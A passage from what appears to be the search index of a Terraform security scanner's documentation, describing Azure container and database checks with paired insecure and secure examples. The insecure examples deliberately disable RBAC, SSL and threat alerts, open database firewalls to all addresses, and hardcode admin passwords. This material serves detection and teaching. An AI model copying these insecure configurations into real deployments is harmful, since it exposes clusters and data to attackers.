Example"},{"location":"checks/azure/compute/no-secrets-in-custom-data/#secure-example","text":"<p>The following example will pass the azure-compute-no-secrets-in-custom-data check. <pre><code> resource \"azurerm_virtual_machine\" \"good_example\" {\n    name = \"good_example\"\n    os_profile_linux_config {\n        disable_password_authentication = false\n    }\n    os_profile {\n        custom_data =&lt;&lt;EOF\n            export GREETING=\"Hello there\"\n            EOF\n    }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/compute/no-secrets-in-custom-data/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/virtual_machine#custom_data</li> </ul>","title":"Links"},{"location":"checks/azure/container/","text":"","title":"container"},{"location":"checks/azure/container/#checks","text":"<ul> <li> <p>configured-network-policy Ensure AKS cluster has Network Policy configured</p> </li> <li> <p>limit-authorized-ips Ensure AKS has an API Server Authorized IP Ranges enabled</p> </li> <li> <p>logging Ensure AKS logging to Azure Monitoring is Configured</p> </li> <li> <p>use-rbac-permissions Ensure RBAC is enabled on AKS clusters</p> </li> </ul>","title":"Checks"},{"location":"checks/azure/container/configured-network-policy/","text":"","title":"Ensure AKS cluster has Network Policy configured"},{"location":"checks/azure/container/configured-network-policy/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/azure/container/configured-network-policy/#explanation","text":"<p>The Kubernetes object type NetworkPolicy should be defined to have opportunity allow or block traffic to pods, as in a Kubernetes cluster configured with default settings, all pods can discover and communicate with each other without any restrictions.</p>","title":"Explanation"},{"location":"checks/azure/container/configured-network-policy/#possible-impact","text":"<p>No network policy is protecting the AKS cluster</p>","title":"Possible Impact"},{"location":"checks/azure/container/configured-network-policy/#suggested-resolution","text":"<p>Configure a network policy</p>","title":"Suggested Resolution"},{"location":"checks/azure/container/configured-network-policy/#insecure-example","text":"<p>The following example will fail the azure-container-configured-network-policy check. <pre><code> resource \"azurerm_kubernetes_cluster\" \"bad_example\" {\n    network_profile {\n      }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/container/configured-network-policy/#secure-example","text":"<p>The following example will pass the azure-container-configured-network-policy check. <pre><code> resource \"azurerm_kubernetes_cluster\" \"good_example\" {\n    network_profile {\n      network_policy = \"calico\"\n      }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/container/configured-network-policy/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/kubernetes_cluster#network_policy</p> </li> <li> <p>https://kubernetes.io/docs/concepts/services-networking/network-policies</p> </li> </ul>","title":"Links"},{"location":"checks/azure/container/limit-authorized-ips/","text":"","title":"Ensure AKS has an API Server Authorized IP Ranges enabled"},{"location":"checks/azure/container/limit-authorized-ips/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/azure/container/limit-authorized-ips/#explanation","text":"<p>The API server is the central way to interact with and manage a cluster. To improve cluster security and minimize attacks, the API server should only be accessible from a limited set of IP address ranges.</p>","title":"Explanation"},{"location":"checks/azure/container/limit-authorized-ips/#possible-impact","text":"<p>Any IP can interact with the API server</p>","title":"Possible Impact"},{"location":"checks/azure/container/limit-authorized-ips/#suggested-resolution","text":"<p>Limit the access to the API server to a limited IP range</p>","title":"Suggested Resolution"},{"location":"checks/azure/container/limit-authorized-ips/#insecure-example","text":"<p>The following example will fail the azure-container-limit-authorized-ips check. <pre><code> resource \"azurerm_kubernetes_cluster\" \"bad_example\" {\n\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/container/limit-authorized-ips/#secure-example","text":"<p>The following example will pass the azure-container-limit-authorized-ips check. <pre><code> resource \"azurerm_kubernetes_cluster\" \"good_example\" {\n     api_server_authorized_ip_ranges = [\n        \"1.2.3.4/32\"\n    ]\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/container/limit-authorized-ips/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/kubernetes_cluster#api_server_authorized_ip_ranges</p> </li> <li> <p>https://docs.microsoft.com/en-us/azure/aks/api-server-authorized-ip-ranges</p> </li> </ul>","title":"Links"},{"location":"checks/azure/container/logging/","text":"","title":"Ensure AKS logging to Azure Monitoring is Configured"},{"location":"checks/azure/container/logging/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/azure/container/logging/#explanation","text":"<p>Ensure AKS logging to Azure Monitoring is configured for containers to monitor the performance of workloads.</p>","title":"Explanation"},{"location":"checks/azure/container/logging/#possible-impact","text":"<p>Logging provides valuable information about access and usage</p>","title":"Possible Impact"},{"location":"checks/azure/container/logging/#suggested-resolution","text":"<p>Enable logging for AKS</p>","title":"Suggested Resolution"},{"location":"checks/azure/container/logging/#insecure-example","text":"<p>The following example will fail the azure-container-logging check. <pre><code> resource \"azurerm_kubernetes_cluster\" \"bad_example\" {\n     addon_profile {}\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/container/logging/#secure-example","text":"<p>The following example will pass the azure-container-logging check. <pre><code> resource \"azurerm_kubernetes_cluster\" \"good_example\" {\n     addon_profile {\n        oms_agent {\n            enabled = true\n        }\n    }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/container/logging/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/kubernetes_cluster#oms_agent</p> </li> <li> <p>https://docs.microsoft.com/en-us/azure/azure-monitor/insights/container-insights-onboard</p> </li> </ul>","title":"Links"},{"location":"checks/azure/container/use-rbac-permissions/","text":"","title":"Ensure RBAC is enabled on AKS clusters"},{"location":"checks/azure/container/use-rbac-permissions/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/azure/container/use-rbac-permissions/#explanation","text":"<p>Using Kubernetes role-based access control (RBAC), you can grant users, groups, and service accounts access to only the resources they need.</p>","title":"Explanation"},{"location":"checks/azure/container/use-rbac-permissions/#possible-impact","text":"<p>No role based access control is in place for the AKS cluster</p>","title":"Possible Impact"},{"location":"checks/azure/container/use-rbac-permissions/#suggested-resolution","text":"<p>Enable RBAC</p>","title":"Suggested Resolution"},{"location":"checks/azure/container/use-rbac-permissions/#insecure-example","text":"<p>The following example will fail the azure-container-use-rbac-permissions check. <pre><code> resource \"azurerm_kubernetes_cluster\" \"bad_example\" {\n    // azurerm &lt; 2.99.0\n    role_based_access_control {\n        enabled = false\n    }\n\n    // azurerm &gt;= 2.99.0\n    role_based_access_control_enabled = false\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/container/use-rbac-permissions/#secure-example","text":"<p>The following example will pass the azure-container-use-rbac-permissions check. <pre><code> resource \"azurerm_kubernetes_cluster\" \"good_example\" {\n    // azurerm &lt; 2.99.0\n    role_based_access_control {\n        enabled = true\n    }\n\n    // azurerm &gt;= 2.99.0\n    role_based_access_control_enabled = true\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/container/use-rbac-permissions/#links","text":"<ul> <li> <p>https://www.terraform.io/docs/providers/azurerm/r/kubernetes_cluster.html#role_based_access_control</p> </li> <li> <p>https://docs.microsoft.com/en-us/azure/aks/concepts-identity</p> </li> </ul>","title":"Links"},{"location":"checks/azure/database/","text":"","title":"database"},{"location":"checks/azure/database/#checks","text":"<ul> <li> <p>all-threat-alerts-enabled No threat detections are set</p> </li> <li> <p>enable-audit Auditing should be enabled on Azure SQL Databases</p> </li> <li> <p>enable-ssl-enforcement SSL should be enforced on database connections where applicable</p> </li> <li> <p>no-public-access Ensure databases are not publicly accessible</p> </li> <li> <p>no-public-firewall-access Ensure database firewalls do not permit public access</p> </li> <li> <p>postgres-configuration-connection-throttling Ensure server parameter 'connection_throttling' is set to 'ON' for PostgreSQL Database Server</p> </li> <li> <p>postgres-configuration-log-checkpoints Ensure server parameter 'log_checkpoints' is set to 'ON' for PostgreSQL Database Server</p> </li> <li> <p>postgres-configuration-log-connections Ensure server parameter 'log_connections' is set to 'ON' for PostgreSQL Database Server</p> </li> <li> <p>retention-period-set Database auditing rentention period should be longer than 90 days</p> </li> <li> <p>secure-tls-policy Databases should have the minimum TLS set for connections</p> </li> <li> <p>threat-alert-email-set At least one email address is set for threat alerts</p> </li> <li> <p>threat-alert-email-to-owner Security threat alerts go to subscription owners and co-administrators</p> </li> </ul>","title":"Checks"},{"location":"checks/azure/database/all-threat-alerts-enabled/","text":"","title":"No threat detections are set"},{"location":"checks/azure/database/all-threat-alerts-enabled/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/azure/database/all-threat-alerts-enabled/#explanation","text":"<p>SQL Server can alert for security issues including SQL Injection, vulnerabilities, access anomalies and data exfiltration. Ensure none of these are disabled to benefit from the best protection</p>","title":"Explanation"},{"location":"checks/azure/database/all-threat-alerts-enabled/#possible-impact","text":"<p>Disabling threat alerts means you are not getting the full benefit of server security protection</p>","title":"Possible Impact"},{"location":"checks/azure/database/all-threat-alerts-enabled/#suggested-resolution","text":"<p>Use all provided threat alerts</p>","title":"Suggested Resolution"},{"location":"checks/azure/database/all-threat-alerts-enabled/#insecure-example","text":"<p>The following example will fail the azure-database-all-threat-alerts-enabled check. <pre><code> resource \"azurerm_mssql_server_security_alert_policy\" \"bad_example\" {\n   resource_group_name        = azurerm_resource_group.example.name\n   server_name                = azurerm_sql_server.example.name\n   state                      = \"Enabled\"\n   storage_endpoint           = azurerm_storage_account.example.primary_blob_endpoint\n   storage_account_access_key = azurerm_storage_account.example.primary_access_key\n   disabled_alerts = [\n     \"Sql_Injection\",\n     \"Data_Exfiltration\"\n   ]\n   retention_days = 20\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/database/all-threat-alerts-enabled/#secure-example","text":"<p>The following example will pass the azure-database-all-threat-alerts-enabled check. <pre><code> resource \"azurerm_mssql_server_security_alert_policy\" \"good_example\" {\n   resource_group_name        = azurerm_resource_group.example.name\n   server_name                = azurerm_sql_server.example.name\n   state                      = \"Enabled\"\n   storage_endpoint           = azurerm_storage_account.example.primary_blob_endpoint\n   storage_account_access_key = azurerm_storage_account.example.primary_access_key\n   disabled_alerts = []\n   retention_days = 20\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/database/all-threat-alerts-enabled/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_server_security_alert_policy#disabled_alerts</li> </ul>","title":"Links"},{"location":"checks/azure/database/enable-audit/","text":"","title":"Auditing should be enabled on Azure SQL Databases"},{"location":"checks/azure/database/enable-audit/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/azure/database/enable-audit/#explanation","text":"<p>Auditing helps you maintain regulatory compliance, understand database activity, and gain insight into discrepancies and anomalies that could indicate business concerns or suspected security violations.</p>","title":"Explanation"},{"location":"checks/azure/database/enable-audit/#possible-impact","text":"<p>Auditing provides valuable information about access and usage</p>","title":"Possible Impact"},{"location":"checks/azure/database/enable-audit/#suggested-resolution","text":"<p>Enable auditing on Azure SQL databases</p>","title":"Suggested Resolution"},{"location":"checks/azure/database/enable-audit/#insecure-example","text":"<p>The following example will fail the azure-database-enable-audit check. <pre><code> resource \"azurerm_sql_server\" \"bad_example\" {\n   name                         = \"mssqlserver\"\n   resource_group_name          = azurerm_resource_group.example.name\n   location                     = azurerm_resource_group.example.location\n   version                      = \"12.0\"\n   administrator_login          = \"mradministrator\"\n   administrator_login_password = \"tfsecRocks\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/database/enable-audit/#secure-example","text":"<p>The following example will pass the azure-database-enable-audit check. <pre><code> resource \"azurerm_sql_server\" \"good_example\" {\n   name                         = \"mssqlserver\"\n   resource_group_name          = azurerm_resource_group.example.name\n   location                     = azurerm_resource_group.example.location\n   version                      = \"12.0\"\n   administrator_login          = \"mradministrator\"\n   administrator_login_password = \"tfsecRocks\"\n\n   extended_auditing_policy {\n     storage_endpoint                        = azurerm_storage_account.example.primary_blob_endpoint\n     storage_account_access_key              = azurerm_storage_account.example.primary_access_key\n     storage_account_access_key_is_secondary = true\n     retention_in_days                       = 6\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/database/enable-audit/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/sql_server#extended_auditing_policy</p> </li> <li> <p>https://docs.microsoft.com/en-us/azure/azure-sql/database/auditing-overview</p> </li> </ul>","title":"Links"},{"location":"checks/azure/database/enable-ssl-enforcement/","text":"","title":"SSL should be enforced on database connections where applicable"},{"location":"checks/azure/database/enable-ssl-enforcement/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/azure/database/enable-ssl-enforcement/#explanation","text":"<p>SSL connections should be enforced were available to ensure secure transfer and reduce the risk of compromising data in flight.</p>","title":"Explanation"},{"location":"checks/azure/database/enable-ssl-enforcement/#possible-impact","text":"<p>Insecure connections could lead to data loss and other vulnerabilities</p>","title":"Possible Impact"},{"location":"checks/azure/database/enable-ssl-enforcement/#suggested-resolution","text":"<p>Enable SSL enforcement</p>","title":"Suggested Resolution"},{"location":"checks/azure/database/enable-ssl-enforcement/#insecure-example","text":"<p>The following example will fail the azure-database-enable-ssl-enforcement check. <pre><code> resource \"azurerm_postgresql_server\" \"bad_example\" {\n   name                = \"bad_example\"\n\n   public_network_access_enabled    = false\n   ssl_enforcement_enabled          = false\n   ssl_minimal_tls_version_enforced = \"TLS1_2\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/database/enable-ssl-enforcement/#secure-example","text":"<p>The following example will pass the azure-database-enable-ssl-enforcement check. <pre><code> resource \"azurerm_postgresql_server\" \"good_example\" {\n   name                = \"good_example\"\n\n   public_network_access_enabled    = false\n   ssl_enforcement_enabled          = true\n   ssl_minimal_tls_version_enforced = \"TLS1_2\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/database/enable-ssl-enforcement/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_server#ssl_enforcement_enabled</p> </li> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mysql_server#ssl_enforcement_enabled</p> </li> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mariadb_server#ssl_enforcement_enabled</p> </li> </ul>","title":"Links"},{"location":"checks/azure/database/no-public-access/","text":"","title":"Ensure databases are not publicly accessible"},{"location":"checks/azure/database/no-public-access/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/azure/database/no-public-access/#explanation","text":"<p>Database resources should not publicly available. You should limit all access to the minimum that is required for your application to function.</p>","title":"Explanation"},{"location":"checks/azure/database/no-public-access/#possible-impact","text":"<p>Publicly accessible database could lead to compromised data</p>","title":"Possible Impact"},{"location":"checks/azure/database/no-public-access/#suggested-resolution","text":"<p>Disable public access to database when not required</p>","title":"Suggested Resolution"},{"location":"checks/azure/database/no-public-access/#insecure-example","text":"<p>The following example will fail the azure-database-no-public-access check. <pre><code> resource \"azurerm_postgresql_server\" \"bad_example\" {\n   name                = \"bad_example\"\n\n   public_network_access_enabled    = true\n   ssl_enforcement_enabled          = false\n   ssl_minimal_tls_version_enforced = \"TLS1_2\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/database/no-public-access/#secure-example","text":"<p>The following example will pass the azure-database-no-public-access check. <pre><code> resource \"azurerm_postgresql_server\" \"good_example\" {\n   name                = \"bad_example\"\n\n   public_network_access_enabled    = false\n   ssl_enforcement_enabled          = false\n   ssl_minimal_tls_version_enforced = \"TLS1_2\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/database/no-public-access/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_server#public_network_access_enabled</p> </li> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mysql_server#public_network_access_enabled</p> </li> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mariadb_server#public_network_access_enabled</p> </li> </ul>","title":"Links"},{"location":"checks/azure/database/no-public-firewall-access/","text":"","title":"Ensure database firewalls do not permit public access"},{"location":"checks/azure/database/no-public-firewall-access/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/azure/database/no-public-firewall-access/#explanation","text":"<p>Azure services can be allowed access through the firewall using a start and end IP address of 0.0.0.0. No other end ip address should be combined with a start of 0.0.0.0</p>","title":"Explanation"},{"location":"checks/azure/database/no-public-firewall-access/#possible-impact","text":"<p>Publicly accessible databases could lead to compromised data</p>","title":"Possible Impact"},{"location":"checks/azure/database/no-public-firewall-access/#suggested-resolution","text":"<p>Don't use wide ip ranges for the sql firewall</p>","title":"Suggested Resolution"},{"location":"checks/azure/database/no-public-firewall-access/#insecure-example","text":"<p>The following example will fail the azure-database-no-public-firewall-access check. <pre><code> resource \"azurerm_sql_firewall_rule\" \"bad_example\" {\n   name                = \"bad_rule\"\n   resource_group_name = azurerm_resource_group.example.name\n   server_name         = azurerm_sql_server.example.name\n   start_ip_address    = \"0.0.0.0\"\n   end_ip_address      = \"255.255.255.255\"\n }\n\n resource \"azurerm_postgresql_firewall_rule\" \"bad_example\" {\n   name                = \"bad_example\"\n   resource_group_name = azurerm_resource_group.example.name\n   server_name         = azurerm_postgresql_server.example.name\n   start_ip_address    = \"0.0.0.0\"\n   end_ip_address      = \"255.255.255.255\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/database/no-public-firewall-access/#secure-example","text":"<p>The following example will pass the azure-database-no-public-firewall-access check. <pre><code> resource \"azurerm_sql_firewall_rule\" \"good_example\" {\n   name                = \"good_rule\"\n   resource_group_name = azurerm_resource_group.example.name\n   server_name         = azurerm_sql_server.example.name\n   start_ip_address    = \"0.0.0.0\"\n   end_ip_address      = \"0.0.0.0\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/database/no-public-firewall-access/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/sql_firewall_rule#end_ip_address</p> </li> <li> <p>https://docs.microsoft.com/en-us/rest/api/sql/2021-02-01-preview/firewall-rules/create-or-update</p> </li> </ul>","title":"Links"},{"location":"checks/azure/database/postgres-configuration-connection-throttling/","text":"","title":"Ensure server parameter 'connection_throttling' is set to 'ON' for PostgreSQL Database Server"},{"location":"checks/azure/database/postgres-configuration-connection-throttling/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/azure/database/postgres-configuration-connection-throttling/#explanation","text":"<p>Postgresql can generate logs for connection throttling to improve visibility for audit and configuration issue resolution.</p>","title":"Explanation"},{"location":"checks/azure/database/postgres-configuration-connection-throttling/#possible-impact","text":"<p>No log information to help diagnosing connection contention issues</p>","title":"Possible Impact"},{"location":"checks/azure/database/postgres-configuration-connection-throttling/#suggested-resolution","text":"<p>Enable connection throttling logging</p>","title":"Suggested Resolution"},{"location":"checks/azure/database/postgres-configuration-connection-throttling/#insecure-example","text":"<p>The following example will fail the azure-database-postgres-configuration-connection-throttling check. <pre><code> resource \"azurerm_resource_group\" \"example\" {\n   name     = \"example-resources\"\n   location = \"West Europe\"\n }\n\n resource \"azurerm_postgresql_server\" \"example\" {\n   name                = \"example-psqlserver\"\n   location            = azurerm_resource_group.example.location\n   resource_group_name = azurerm_resource_group.example.name\n\n   administrator_login          = \"psqladminun\"\n   administrator_login_password = \"H@Sh1CoR3!\"\n\n   sku_name   = \"GP_Gen5_4\"\n   version    = \"9.6\"\n   storage_mb = 640000\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/database/postgres-configuration-connection-throttling/#secure-example","text":"<p>The following example will pass the azure-database-postgres-configuration-connection-throttling check. <pre><code> resource \"azurerm_resource_group\" \"example\" {\n   name     = \"example-resources\"\n   location = \"West Europe\"\n }\n\n resource \"azurerm_postgresql_server\" \"example\" {\n   name                = \"example-psqlserver\"\n   location            = azurerm_resource_group.example.location\n   resource_group_name = azurerm_resource_group.example.name\n\n   administrator_login          = \"psqladminun\"\n   administrator_login_password = \"H@Sh1CoR3!\"\n\n   sku_name   = \"GP_Gen5_4\"\n   version    = \"9.6\"\n   storage_mb = 640000\n }\n\n resource \"azurerm_postgresql_configuration\" \"example\" {\n    name                = \"connection_throttling\"\n    resource_group_name = azurerm_resource_group.example.name\n    server_name         = azurerm_postgresql_server.example.name\n    value               = \"on\"\n   }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/database/postgres-configuration-connection-throttling/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_configuration</p> </li> <li> <p>https://docs.microsoft.com/en-us/azure/postgresql/concepts-server-logs#configure-logging</p> </li> </ul>","title":"Links"},{"location":"checks/azure/database/postgres-configuration-log-checkpoints/","text":"","title":"Ensure server parameter 'log_checkpoints' is set to 'ON' for PostgreSQL Database Server"},{"location":"checks/azure/database/postgres-configuration-log-checkpoints/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/azure/database/postgres-configuration-log-checkpoints/#explanation","text":"<p>Postgresql can generate logs for checkpoints to improve visibility for audit and configuration issue resolution.</p>","title":"Explanation"},{"location":"checks/azure/database/postgres-configuration-log-checkpoints/#possible-impact","text":"<p>No error and query logs generated on checkpoint</p>","title":"Possible Impact"},{"location":"checks/azure/database/postgres-configuration-log-checkpoints/#suggested-resolution","text":"<p>Enable checkpoint logging</p>","title":"Suggested Resolution"},{"location":"checks/azure/database/postgres-configuration-log-checkpoints/#insecure-example","text":"<p>The following example will fail the azure-database-postgres-configuration-log-checkpoints check. <pre><code> resource \"azurerm_resource_group\" \"example\" {\n   name     = \"example-resources\"\n   location = \"West Europe\"\n }\n\n resource \"azurerm_postgresql_server\" \"example\" {\n   name                = \"example-psqlserver\"\n   location            = azurerm_resource_group.example.location\n   resource_group_name = azurerm_resource_group.example.name\n\n   administrator_login          = \"psqladminun\"\n   administrator_login_password = \"H@Sh1CoR3!\"\n\n   sku_name   = \"GP_Gen5_4\"\n   version    = \"9.6\"\n   storage_mb = 640000\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/database/postgres-configuration-log-checkpoints/#secure-example","text":"<p>The following example will pass the azure-database-postgres-configuration-log-checkpoints check. <pre><code> resource \"azurerm_resource_group\" \"example\" {\n   name     = \"example-resources\"\n   location = \"West Europe\"\n }\n\n resource \"azurerm_postgresql_server\" \"example\" {\n   name                = \"example-psqlserver\"\n   location            = azurerm_resource_group.example.location\n   resource_group_name = azurerm_resource_group.example.name\n\n   administrator_login          = \"psqladminun\"\n   administrator_login_password = \"H@Sh1CoR3!\"\n\n   sku_name   = \"GP_Gen5_4\"\n   version    = \"9.6\"\n   storage_mb = 640000\n }\n\n resource \"azurerm_postgresql_configuration\" \"example\" {\n   name                = \"log_checkpoints\"\n   resource_group_name = azurerm_resource_group.example.name\n   server_name         = azurerm_postgresql_server.example.name\n   value               = \"on\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/database/postgres-configuration-log-checkpoints/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_configuration</p> </li> <li> <p>https://docs.microsoft.com/en-us/azure/postgresql/concepts-server-logs#configure-logging</p> </li> </ul>","title":"Links"},{"location":"checks/azure/database/postgres-configuration-log-connections/","text":"","title":"Ensure server parameter 'log_connections' is set to 'ON' for PostgreSQL Database Server"},{"location":"checks/azure/database/postgres-configuration-log-connections/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/azure/database/postgres-configuration-log-connections/#explanation","text":"<p>Postgresql can generate logs for successful connections to improve visibility for audit and configuration issue resolution.</p>","title":"Explanation"},{"location":"checks/azure/database/postgres-configuration-log-connections/#possible-impact","text":"<p>No visibility of successful connections</p>","title":"Possible Impact"},{"location":"checks/azure/database/postgres-configuration-log-connections/#suggested-resolution","text":"<p>Enable connection logging</p>","title":"Suggested Resolution"},{"location":"checks/azure/database/postgres-configuration-log-connections/#insecure-example","text":"<p>The following example will fail the azure-database-postgres-configuration-log-connections check. <pre><code> resource \"azurerm_resource_group\" \"example\" {\n   name     = \"example-resources\"\n   location = \"West Europe\"\n }\n\n resource \"azurerm_postgresql_server\" \"example\" {\n   name                = \"example-psqlserver\"\n   location            = azurerm_resource_group.example.location\n   resource_group_name = azurerm_resource_group.example.name\n\n   administrator_login          = \"psqladminun\"\n   administrator_login_password = \"H@Sh1CoR3!\"\n\n   sku_name   = \"GP_Gen5_4\"\n   version    = \"9.6\"\n   storage_mb = 640000\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/database/postgres-configuration-log-connections/#secure-example","text":"<p>The following example will pass the azure-database-postgres-configuration-log-connections check. <pre><code> resource \"azurerm_resource_group\" \"example\" {\n   name     = \"example-resources\"\n   location = \"West Europe\"\n }\n\n resource \"azurerm_postgresql_server\" \"example\" {\n   name                = \"example-psqlserver\"\n   location            = azurerm_resource_group.example.location\n   resource_group_name = azurerm_resource_group.example.name\n\n   administrator_login          = \"psqladminun\"\n   administrator_login_password = \"H@Sh1CoR3!\"\n\n   sku_name   = \"GP_Gen5_4\"\n   version    = \"9.6\"\n   storage_mb = 640000\n }\n\n resource \"azurerm_postgresql_configuration\" \"example\" {\n    name                = \"log_connections\"\n    resource_group_name = azurerm_resource_group.example.name\n    server_name         = azurerm_postgresql_server.example.name\n    value               = \"on\"\n   }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/database/postgres-configuration-log-connections/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_configuration</p> </li> <li> <p>https://docs.microsoft.com/en-us/azure/postgresql/concepts-server-logs#configure-logging</p> </li> <li> <p>https://docs.microsoft.com/en-us/azure/postgresql/concepts-server-logs#configure-logging</p> </li> </ul>","title":"Links"},{"location":"checks/azure/database/retention-period-set/","text":"","title":"Database auditing rentention period should be longer than 90 days"},{"location":"checks/azure/database/retention-period-set/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/azure/database/retention-period-set/#explanation","text":"<p>When Auditing is configured for a SQL database, if the retention period is not set, the retention will be unlimited.</p> <p>If the retention period is to be explicitly set, it should be set for no less than 90 days.</p>","title":"Explanation"},{"location":"checks/azure/database/retention-period-set/#possible-impact","text":"<p>Short logging retention could result in missing valuable historical information</p>","title":"Possible Impact"},{"location":"checks/azure/database/retention-period-set/#suggested-resolution","text":"<p>Set retention periods of database auditing to greater than 90 days</p>","title":"Suggested Resolution"},{"location":"checks/azure/database/retention-period-set/#insecure-example","text":"<p>The following example will fail the azure-database-retention-period-set check. <pre><code> resource \"azurerm_mssql_database_extended_auditing_policy\" \"bad_example\" {\n   database_id                             = azurerm_mssql_database.example.id\n   storage_endpoint                        = azurerm_storage_account.example.primary_blob_endpoint\n   storage_account_access_key              = azurerm_storage_account.example.primary_access_key\n   storage_account_access_key_is_secondary = false\n   retention_in_days                       = 6\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/database/retention-period-set/#secure-example","text":"<p>The following example will pass the azure-database-retention-period-set check. <pre><code> resource \"azurerm_mssql_database_extended_auditing_policy\" \"good_example\" {\n   database_id                             = azurerm_mssql_database.example.id\n   storage_endpoint                        = azurerm_storage_account.example.primary_blob_endpoint\n   storage_account_access_key              = azurerm_storage_account.example.primary_access_key\n   storage_account_access_key_is_secondary = false\n }\n\n resource \"azurerm_mssql_database_extended_auditing_policy\" \"good_example\" {\n   database_id                             = azurerm_mssql_database.example.id\n   storage_endpoint                        = azurerm_storage_account.example.primary_blob_endpoint\n   storage_account_access_key              = azurerm_storage_account.example.primary_access_key\n   storage_account_access_key_is_secondary = false\n   retention_in_days                       = 90\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/database/retention-period-set/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_database_extended_auditing_policy</p> </li> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_server#retention_in_days</p> </li> <li> <p>https://docs.microsoft.com/en-us/azure/azure-sql/database/auditing-overview</p> </li> </ul>","title":"Links"},{"location":"checks/azure/database/secure-tls-policy/","text":"","title":"Databases should have the minimum TLS set for connections"},{"location":"checks/azure/database/secure-tls-policy/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/azure/database/secure-tls-policy/#explanation","text":"<p>You should not use outdated/insecure TLS versions for encryption. You should be using TLS v1.2+.</p>","title":"Explanation"},{"location":"checks/azure/database/secure-tls-policy/#possible-impact","text":"<p>Outdated TLS policies increase exposure to known issues</p>","title":"Possible Impact"},{"location":"checks/azure/database/secure-tls-policy/#suggested-resolution","text":"<p>Use the most modern TLS policies available</p>","title":"Suggested Resolution"},{"location":"checks/azure/database/secure-tls-policy/#insecure-example","text":"<p>The following example will fail the azure-database-secure-tls-policy check. <pre><code> resource \"azurerm_mssql_server\" \"bad_example\" {\n   name                         = \"mssqlserver\"\n   resource_group_name          = azurerm_resource_group.example.name\n   location                     = azurerm_resource_group.example.location\n   version                      = \"12.0\"\n   administrator_login          = \"missadministrator\"\n   administrator_login_password = \"thisIsKat11\"\n   minimum_tls_version          = \"1.1\"\n }\n\n resource \"azurerm_postgresql_server\" \"bad_example\" {\n    name                = \"bad_example\"\n\n    public_network_access_enabled    = true\n    ssl_enforcement_enabled          = false\n    ssl_minimal_tls_version_enforced = \"TLS1_1\"\n   }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/database/secure-tls-policy/#secure-example","text":"<p>The following example will pass the azure-database-secure-tls-policy check. <pre><code> resource \"azurerm_mssql_server\" \"good_example\" {\n   name                         = \"mssqlserver\"\n   